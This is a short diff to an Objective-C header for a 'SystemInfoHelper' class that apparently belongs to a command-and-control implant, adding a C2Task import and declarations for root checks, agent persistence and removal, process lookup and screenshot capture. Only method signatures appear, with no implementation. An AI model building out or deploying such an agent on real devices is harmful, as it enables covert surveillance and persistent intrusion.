@@ -1,4 +1,12 @@
 #import <Foundation/Foundation.h>
+#import <ifaddrs.h>
+#import <arpa/inet.h>
+#import <sys/types.h>
+#import <sys/sysctl.h>
+#import <UIKit/UIKit.h>
+#include <mach-o/dyld.h>
+
+#import "C2Task.h"
 
 @interface SystemInfoHelper : NSObject
 
@@ -6,9 +14,15 @@
 + (NSString *)getExternalIPAddress;
 + (NSString *)getArchitecture;
 + (NSInteger)getPID;
++ (BOOL)isRootUser;
 + (NSString *)getUser;
 + (NSString *)getHost;
 + (NSString *)getOS;
 + (NSString *)getDomain;
++ (BOOL)uninstallAgent;
++ (BOOL)persistAgent;
++ (BOOL)agentIsInstalled;
++ (NSString *)getProcessName;
++ (void)takeScreenshotWithTask:(id)task;
 
 @end
